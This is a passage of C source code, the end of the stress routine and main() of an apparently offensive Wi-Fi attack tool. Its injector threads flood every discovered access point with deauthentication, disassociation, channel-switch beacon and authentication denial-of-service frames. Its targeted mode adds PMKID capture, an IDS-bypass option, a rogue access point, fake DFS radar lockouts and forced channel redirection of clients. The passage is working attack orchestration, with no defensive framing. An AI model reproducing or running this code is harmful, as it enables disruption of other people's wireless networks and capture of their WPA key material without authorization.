        ha2->chlist[ha2->nch++] = CH_5[i];

      if (pthread_create(&hop_t[n_hop], NULL, stress_hopper_thread, ha2) == 0)
        n_hop++;
      else
        free(ha2);
    }
  }

  
  printf("  Discovering targets");
  for (int i = 0; i < 20 && !g_stop; i++) {
    usleep_precise(0.1);
    printf(".");
    fflush(stdout);
  }
  printf(" " C_AQUA "%d APs found" RST "\n\n", atomic_load(&g_stress_aps_seen));

  
  pthread_t inj_t[2];
  int n_inj = 0;

  if (cfg->split_role) {
    /* [UPGRADE] Hunter-Killer Split Role: All injection happens only on iface2.
     * Band is 0 (all bands), bypassing sharding so it can shoot anything found by the scanner. */
    if (cfg->dual_radio && cfg->iface2[0]) {
      stress_inj_arg_t *ia = calloc(1, sizeof(*ia));
      ia->cfg = cfg;
      ia->pool = &pool;
      ia->band = 0; 
      snprintf(ia->iface, MAX_IFACE, "%s", cfg->iface2);
      ia->radio_idx = 1;
      if (pthread_create(&inj_t[n_inj], NULL, stress_injector_thread, ia) == 0)
        n_inj++;
      else
        free(ia);
    } else {
      
      stress_inj_arg_t *ia = calloc(1, sizeof(*ia));
      ia->cfg = cfg;
      ia->pool = &pool;
      ia->band = 0;
      snprintf(ia->iface, MAX_IFACE, "%s", cfg->iface);
      ia->radio_idx = 0;
      if (pthread_create(&inj_t[n_inj], NULL, stress_injector_thread, ia) == 0)
        n_inj++;
      else
        free(ia);
    }
  } else {
    
    stress_inj_arg_t *ia1 = calloc(1, sizeof(*ia1));
    ia1->cfg = cfg;
    ia1->pool = &pool;
    ia1->band = 2;
    snprintf(ia1->iface, MAX_IFACE, "%s", cfg->iface);
    ia1->radio_idx = 0;
    if (pthread_create(&inj_t[n_inj], NULL, stress_injector_thread, ia1) == 0)
      n_inj++;
    else
      free(ia1);

    
    if (cfg->scan_5ghz) {
      stress_inj_arg_t *ia2 = calloc(1, sizeof(*ia2));
      ia2->cfg = cfg;
      ia2->pool = &pool;
      ia2->band = 5;
      if (cfg->dual_radio && cfg->iface2[0]) {
        snprintf(ia2->iface, MAX_IFACE, "%s", cfg->iface2);
        ia2->radio_idx = 1;
      } else {
        snprintf(ia2->iface, MAX_IFACE, "%s", cfg->iface);
        ia2->radio_idx = 0;
      }
      if (pthread_create(&inj_t[n_inj], NULL, stress_injector_thread, ia2) == 0)
        n_inj++;
      else
        free(ia2);
    }
  }

  
  stress_disp_arg_t *da = calloc(1, sizeof(*da));
  da->cfg = cfg;
  da->pool = &pool;
  pthread_t disp_t;
  pthread_create(&disp_t, NULL, stress_display_thread, da);

  
  if (cfg->duration > 0) {
    double end = mono_time() + cfg->duration;
    while (!g_stop && mono_time() < end)
      usleep_precise(0.5);
    g_stop = 1;
  } else {
    while (!g_stop)
      usleep_precise(0.5);
  }

  
  for (int i = 0; i < n_scan; i++)
    pthread_join(scan_t[i], NULL);
  for (int i = 0; i < n_hop; i++)
    pthread_join(hop_t[i], NULL);
  for (int i = 0; i < n_inj; i++)
    pthread_join(inj_t[i], NULL);
  pthread_join(disp_t, NULL);

  
  printf("\033[?25h\033[2J\033[H");
  double elapsed = mono_time() - g_start_time;
  uint64_t sent = atomic_load(&g_pkts_sent);
  uint64_t fail = atomic_load(&g_pkts_fail);
  int final_aps = atomic_load(&g_stress_aps_seen);
  double pps = elapsed > 0 ? (double)sent / elapsed : 0;

  printf("\n  " C_DEEP_B
         "╔══════════════════════════════════════════════════════════╗" RST
         "\n");
  printf(
      "  ║" C_AQUA BLD
      "      STRESS TEST COMPLETE                               " RST C_DEEP_B
      "║" RST "\n");
  printf("  " C_DEEP_B
         "╠══════════════════════════════════════════════════════════╣" RST
         "\n");
  printf("  ║ " C_GRAY "Interface " RST "  " C_CYAN "%-46s" RST "║\n",
         cfg->iface);
  printf("  ║ " C_GRAY "APs Hit   " RST "  " C_AQUA "%-46d" RST "║\n",
         final_aps);
  printf("  ║ " C_GRAY "Duration  " RST "  " C_ICE "%02d:%02d:%02d" RST
         "                                       ║\n",
         (int)(elapsed / 3600), (int)(fmod(elapsed, 3600) / 60),
         (int)(fmod(elapsed, 60)));
  printf("  ║ " C_GRAY "Packets   " RST "  " C_AQUA "%-46lu" RST "║\n",
         (unsigned long)sent);
  printf("  ║ " C_GRAY "Rate      " RST "  " C_ICE "%.1f pps" RST
         "                                       ║\n",
         pps);
  printf("  ║ " C_GRAY "Failures  " RST "  %s%-46lu" RST "║\n",
         fail > 0 ? C_RED : C_GRAY, (unsigned long)fail);
  printf("  " C_DEEP_B
         "╚══════════════════════════════════════════════════════════╝" RST
         "\n\n");

  
  set_ch(cfg->iface, 1);
  export_report(cfg->export_file, &pool, elapsed, sent, fail);
  pthread_mutex_destroy(&pool.lock);
}

/* ============================================================
 *               MAIN
 * ============================================================ */

int main(int argc, char **argv) {
  srand((unsigned)time(NULL) ^ (unsigned)getpid());

  /* [FIX 40] --help */
  for (int i = 1; i < argc; i++) {
    if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0) {
      print_help();
      return 0;
    }
  }

  if (getuid() != 0) {
    printf(C_RED "[!] Run as root" RST "\n");
    return 1;
  }

  
  if (argc >= 3 && strcmp(argv[1], "--script") == 0) {
    if (system("clear")) {
    }
    printf("%s\n", BANNER);
    if (!preflight())
      return 1;
    run_script(argv[2]);
    return 0;
  }

  if (system("clear")) {
  }
  printf("%s\n", BANNER);
  if (!preflight())
    return 1;

  
  char global_iface[MAX_IFACE] = {0};
  bool stress_mode = false;
  bool stress_5ghz = false;
  bool unmask_hidden = false;
  bool split_role = false;
  bool global_dual_radio = false;
  char global_iface2[MAX_IFACE] = {0};
  char export_file[MAX_PATH_LEN] = "";
  char global_target_ssid_str[MAX_SSID_LEN * MAX_TRACK_SSIDS + 1] = {0};
  for (int i = 1; i < argc; i++) {
    if ((strcmp(argv[i], "--iface") == 0 || strcmp(argv[i], "-i") == 0) && i + 1 < argc)
      snprintf(global_iface, MAX_IFACE, "%s", argv[++i]);
    if (strcmp(argv[i], "--stress") == 0)
      stress_mode = true;
    if (strcmp(argv[i], "--5ghz") == 0)
      stress_5ghz = true;
    if (strcmp(argv[i], "--unmask-hidden") == 0)
      unmask_hidden = true;
    if (strcmp(argv[i], "--dual") == 0 && i + 1 < argc) {
      snprintf(global_iface2, MAX_IFACE, "%s", argv[++i]);
      global_dual_radio = true;
    }
    if (strcmp(argv[i], "--export") == 0 && i + 1 < argc)
      snprintf(export_file, MAX_PATH_LEN, "%s", argv[++i]);
    if (strcmp(argv[i], "--split-role") == 0)
      split_role = true;
    if ((strcmp(argv[i], "--target-ssid") == 0 || strcmp(argv[i], "--ssid") == 0) && i + 1 < argc)
      snprintf(global_target_ssid_str, sizeof(global_target_ssid_str), "%s", argv[++i]);
  }

  if (stress_mode) {
    /* === STRESS TEST MODE === */
    stress_cfg_t scfg = {0};
    scfg.mode = MODE_MEDIUM;
    scfg.scan_5ghz = stress_5ghz;
    scfg.unmask_hidden = unmask_hidden;
    scfg.dual_radio = global_dual_radio;
    scfg.split_role = split_role;
    
    if (global_target_ssid_str[0]) {
      char *token = strtok(global_target_ssid_str, ",");
      while (token != NULL && scfg.target_ssid_track_cnt < MAX_TRACK_SSIDS) {
        snprintf(scfg.target_ssid_track[scfg.target_ssid_track_cnt++], MAX_SSID_LEN + 1, "%s", token);
        token = strtok(NULL, ",");
      }
    }
    if (global_dual_radio) {
      snprintf(scfg.iface2, sizeof(scfg.iface2), "%s", global_iface2);
    }
    if (global_iface[0]) {
      snprintf(scfg.iface, sizeof(scfg.iface), "%s", global_iface);
    }

    
    menu_iface(scfg.iface, sizeof(scfg.iface));

    
    printf("\n  " C_CYAN BLD "Stress Vectors" RST "\n\n");
    printf("  Use default stress vectors (Deauth+Disassoc+CSA+Auth)?\n");
    printf("  " C_AQUA "Y" RST " = Default    " C_AQUA "N" RST
           " = Custom selection\n\n");
    char buf[32];
    printf("  Default? " C_GRAY "[Y]" RST ": ");
    fflush(stdout);
    if (!fgets(buf, sizeof(buf), stdin))
      exit(0);

    if (buf[0] == 'n' || buf[0] == 'N') {
      config_t tmp = {0};
      menu_vectors(&tmp);
      memcpy(scfg.vec_on, tmp.vec_on, sizeof(scfg.vec_on));
      scfg.nvec = tmp.nvec;
    } else {
      
      scfg.vec_on[VEC_DEAUTH_FLOOD] = true;
      scfg.vec_on[VEC_DISASSOC_FLOOD] = true;
      scfg.vec_on[VEC_CSA_BEACON] = true;
      scfg.vec_on[VEC_AUTH_DOS] = true;
      scfg.nvec = 4;
    }

    
    scfg.mode = menu_mode();

    
    printf("\n  Duration (seconds, 0=unlimited) " C_GRAY "[0]" RST ": ");
    fflush(stdout);
    if (fgets(buf, sizeof(buf), stdin)) {
      int d = atoi(buf);
      if (d > 0)
        scfg.duration = d;
    }

    run_stress(&scfg);
    return 0;
  }

  /* === NORMAL TARGETED MODE === */

  /* [FIX 36] Parse CLI flags */
  config_t cfg = {0};
  bool cli_pmkid = false, cli_bypass = false, cli_rogue = false;
  const char *cli_stats = NULL;

  for (int i = 1; i < argc; i++) {
    if (strcmp(argv[i], "--pmkid") == 0)
      cli_pmkid = true;
    else if (strcmp(argv[i], "--ids-bypass") == 0)
      cli_bypass = true;
    else if (strcmp(argv[i], "--rogue") == 0)
      cli_rogue = true;
    else if (strcmp(argv[i], "--dual") == 0 && i + 1 < argc) {
      
      i++;
    } else if ((strcmp(argv[i], "--iface") == 0 || strcmp(argv[i], "-i") == 0) && i + 1 < argc) {
      i++;
    } else if ((strcmp(argv[i], "--target-ssid") == 0 || strcmp(argv[i], "--ssid") == 0) && i + 1 < argc) {
      i++;
    } else if (strcmp(argv[i], "--stats") == 0 && i + 1 < argc) {
      cli_stats = argv[++i];
    } else if (strcmp(argv[i], "--export") == 0 && i + 1 < argc) {
      snprintf(export_file, MAX_PATH_LEN, "%s", argv[++i]);
    } else if (strcmp(argv[i], "--split-role") == 0) {
      cfg.split_role = true;
    }
  }

  if (global_dual_radio) {
    snprintf(cfg.iface2, MAX_IFACE, "%s", global_iface2);
    cfg.dual_radio = true;
  }

  char iface[MAX_IFACE] = {0};
  if (global_iface[0]) {
    snprintf(iface, MAX_IFACE, "%s", global_iface);
  }
  menu_iface(iface, sizeof(iface));

  target_ap_t tgt = {0};
  menu_target(iface, &tgt);
  printf("\n  Target: " C_ICE "%s" RST " (%s) ch %d\n", tgt.bssid, tgt.ssid,
         tgt.channel);

  char dch[16];
  snprintf(dch, sizeof(dch), "%d", tgt.channel < 14 ? tgt.channel + 1 : 1);
  char ncs[16];
  input_prompt("Redirect channel", ncs, sizeof(ncs), vch,
               "Invalid (1-14/36-165)", dch);
  int new_ch = atoi(ncs);

  /* [FIX 46] DFS redirect info */
  if (is_dfs_ch(new_ch))
    printf("  " C_YELLOW "[DFS] Channel %d is DFS — clients must wait for CAC "
           "(~60s) to use it" RST "\n",
           new_ch);

  printf("\n  1. Broadcast (all clients)\n  2. Specific MAC\n\n");
  char buf[32];
  printf("  Client [1-2] " C_GRAY "[1]" RST ": ");
  fflush(stdout);
  if (!fgets(buf, sizeof(buf), stdin))
    exit(0);
  char cli[MAX_MAC_STR] = "ff:ff:ff:ff:ff:ff";
  if (buf[0] == '2')
    input_prompt("Client MAC", cli, sizeof(cli), vmc, "Invalid MAC", "");

  snprintf(cfg.iface, MAX_IFACE, "%s", iface);
  cfg.new_ch = new_ch;
  snprintf(cfg.client, MAX_MAC_STR, "%s", cli);
  cfg.log_pmkid = cli_pmkid;
  cfg.ids_bypass = cli_bypass;
  cfg.spawn_rogue = cli_rogue;
  if (cli_stats)
    snprintf(cfg.stats_file, MAX_PATH_LEN, "%s", cli_stats);

  menu_vectors(&cfg);
  cfg.mode = menu_mode();

  
  printf("\n  " C_DEEP_B "══════════════════════════════════════" RST "\n");
  printf("  IF: %-16s  BSSID: %s\n", iface, tgt.bssid);
  printf("  SSID: %-14s  CH: %d → %d\n", tgt.ssid, tgt.channel, new_ch);
  printf("  Client: %-12s  Mode: %s  Vec: %d\n", cli, MODE_NAMES[cfg.mode],
         cfg.nvec);
  if (cfg.log_pmkid)
    printf("  " C_GREEN "[PMKID]" RST " capture enabled\n");
  if (cfg.ids_bypass)
    printf("  " C_YELLOW "[IDS]" RST " bypass enabled\n");
  if (cfg.dual_radio)
    printf("  " C_CYAN "[DUAL]" RST " %s\n", cfg.iface2);
  if (cfg.spawn_rogue)
    printf("  " C_ORANGE "[ROGUE]" RST " AP enabled\n");
  if (cfg.vec_on[VEC_DFS_FAKE_RADAR]) {
    if (is_dfs_ch(tgt.channel))
      printf("  " C_YELLOW "[OCA]" RST
             " DFS Fake Radar on ch %d — CAC/Non-Occupancy lockout\n",
             tgt.channel);
    else
      printf("  " C_YELLOW "[OCA]" RST
             " DFS Fake Radar active (target ch %d non-DFS)\n",
             tgt.channel);
  }
  printf("  " C_DEEP_B "══════════════════════════════════════" RST "\n");

  printf("\n  " C_RED BLD "Deploy?" RST " (y/N): ");
  fflush(stdout);
  if (!fgets(buf, sizeof(buf), stdin) || buf[0] != 'y') {
    printf("  Cancelled.\n");
    return 0;
  }

  printf("\n  Locking %s to ch %d...\n", iface, tgt.channel);
  set_ch(iface, tgt.channel);
  usleep_precise(0.3);

  factory_t fac;
  if (!factory_build(&fac, &tgt, new_ch, cli))
    return 1;
  engine_t eng;
  engine_init(&eng, &cfg, &fac);
  start_rogue(&cfg, &tgt);

  g_start_time = mono_time();
  signal(SIGINT, sig_handler);
  signal(SIGTERM, sig_handler);

  printf("  " C_GREEN "[✓] Deployed — %s" RST "\n\n", MODE_NAMES[cfg.mode]);

  pthread_t ch_t = start_ch_lock(&cfg, tgt.channel);
  pthread_t cap_t = start_capture(&cfg, &tgt);
  pthread_t dsp_t = start_display(&cfg, &tgt, 0.1, cfg.stats_file);
  engine_start(&eng);

  while (!g_stop)
    usleep_precise(0.5);

  engine_stop(&eng);
  pthread_join(ch_t, NULL);
  pthread_join(cap_t, NULL);
  pthread_join(dsp_t, NULL);
  stop_rogue(cfg.iface2);
  print_summary(&cfg, &tgt);
  if (export_file[0]) {
    stress_pool_t single_pool;
    stress_pool_init(&single_pool);
    uint8_t zero_mac[6] = {0};
    stress_pool_add(&single_pool, zero_mac, tgt.ssid, tgt.channel, -50, "");
    parse_mac(tgt.bssid, single_pool.aps[0].bssid);
    format_mac(single_pool.aps[0].bssid, single_pool.aps[0].bssid_str);
    atomic_store(&single_pool.aps[0].tx_count, atomic_load(&g_pkts_sent));
    export_report(export_file, &single_pool, mono_time() - g_start_time,
                  atomic_load(&g_pkts_sent), atomic_load(&g_pkts_fail));
    pthread_mutex_destroy(&single_pool.lock);
  }
  return 0;
}